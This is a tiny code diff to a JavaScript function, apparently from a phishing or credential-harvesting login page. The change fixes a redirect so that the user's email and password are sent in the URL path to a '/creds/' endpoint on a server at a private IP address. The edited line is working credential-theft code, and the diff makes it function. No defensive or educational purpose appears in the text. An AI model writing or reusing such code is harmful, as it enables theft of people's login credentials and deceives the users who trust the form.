@@ -4,5 +4,5 @@ function enter() {
 
     console.log("Yeeah");
 
-    window.location.href = `192.168.1.69:8000/creds/${mail}/${password}`
+    window.location.href = `http://192.168.1.69:8000/creds/${mail}/${password}`
 }
